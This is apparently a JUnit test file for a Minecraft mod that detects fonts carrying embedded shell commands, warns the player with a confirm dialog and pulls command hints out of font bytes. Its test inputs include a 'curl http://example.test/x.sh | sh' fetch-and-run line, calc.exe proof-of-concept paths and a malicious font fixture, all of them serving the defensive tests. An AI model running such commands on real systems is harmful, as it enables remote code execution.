package dev.duckducktw.m2sfix.core;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.screens.ConfirmScreen;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

/**
 * Exercises {@link Notify} against Minecraft stand-ins: the reflection path it uses inside the agent
 * has to build a real confirm screen with the two buttons and wire the callback correctly.
 */
class NotifyTest {

    private Minecraft client;

    @BeforeEach
    void setUp() {
        client = Minecraft.getInstance();
        client.reset();
        Notify.resetForTests();
        FaceGuard.clearForTests();
        System.clearProperty(FixPolicy.PROP_NOTIFY);
    }

    @AfterEach
    void tearDown() {
        client.reset();
        System.clearProperty(FixPolicy.PROP_NOTIFY);
        FaceGuard.clearForTests();
    }

    @Test
    void warningShowsAConfirmScreenWithBothButtons() {
        Notify.warnAboutBlockedFont("C:\\Windows\\System32\\calc.exe");

        assertTrue(client.currentScreen instanceof ConfirmScreen, "expected a confirm screen");
        ConfirmScreen screen = (ConfirmScreen) client.currentScreen;
        assertEquals("minecraft2shell-fix", screen.title.getString());
        assertTrue(screen.message.getString().contains("minecraft2shell"), screen.message.getString());
        assertTrue(screen.message.getString().contains("calc.exe"), screen.message.getString());
        assertTrue(screen.message.getString().contains("已經攔截"), screen.message.getString());
        assertTrue(screen.yesButton.getString().contains("繼續遊玩"), screen.yesButton.getString());
        assertTrue(screen.noButton.getString().contains("中斷連線"), screen.noButton.getString());
        assertFalse(client.disconnectCalled, "showing the dialog must not disconnect anyone");
    }

    @Test
    void unknownCommandStillProducesAReadableMessage() {
        Notify.warnAboutBlockedFont(null);

        ConfirmScreen screen = (ConfirmScreen) client.currentScreen;
        assertNotNull(screen);
        assertTrue(screen.message.getString().contains("無法辨識"), screen.message.getString());
    }

    @Test
    void continueButtonKeepsThePlayerConnected() {
        Notify.warnAboutBlockedFont("curl http://example.test/x.sh | sh");

        ((ConfirmScreen) client.currentScreen).callback.accept(true);

        assertFalse(client.disconnectCalled);
    }

    @Test
    void disconnectButtonDropsTheConnection() {
        Notify.warnAboutBlockedFont("calc.exe");

        ((ConfirmScreen) client.currentScreen).callback.accept(false);

        assertTrue(client.disconnectCalled);
    }

    @Test
    void notifyCanBeTurnedOff() {
        System.setProperty(FixPolicy.PROP_NOTIFY, "false");
        FaceGuard.clearForTests();

        Notify.warnAboutBlockedFont("calc.exe");

        assertEquals(null, client.currentScreen);
    }

    @Test
    void aFlaggedFontTriggersTheWarningOnceOnly() throws Exception {
        byte[] hostile = java.nio.file.Files.readAllBytes(java.nio.file.Path.of(
                NotifyTest.class.getResource("/fonts/malicious-idef.ttf").toURI()));

        FaceGuard.inspectNewFace(0x1234L, java.nio.ByteBuffer.wrap(hostile), hostile.length);
        ConfirmScreen first = (ConfirmScreen) client.currentScreen;
        assertNotNull(first, "the first flagged font must warn");

        client.reset();
        FaceGuard.inspectNewFace(0x5678L, java.nio.ByteBuffer.wrap(hostile), hostile.length);
        assertEquals(null, client.currentScreen, "the same font must not warn twice");
    }

    @Test
    void payloadHintFindsACommandInsideFontBytes() {
        byte[] font = ("\u0000\u0001junkjkunk \u0001\u0001C:\\Windows\\System32\\calc.exe\u0001\u0002")
                .getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);

        assertEquals("C:\\Windows\\System32\\calc.exe", PayloadHint.find(font));
    }

    @Test
    void payloadHintIgnoresOrdinaryFontData() {
        byte[] font = "abcdef ghijkl mnopqr stuvwx".getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);

        assertEquals(null, PayloadHint.find(font));
    }
}
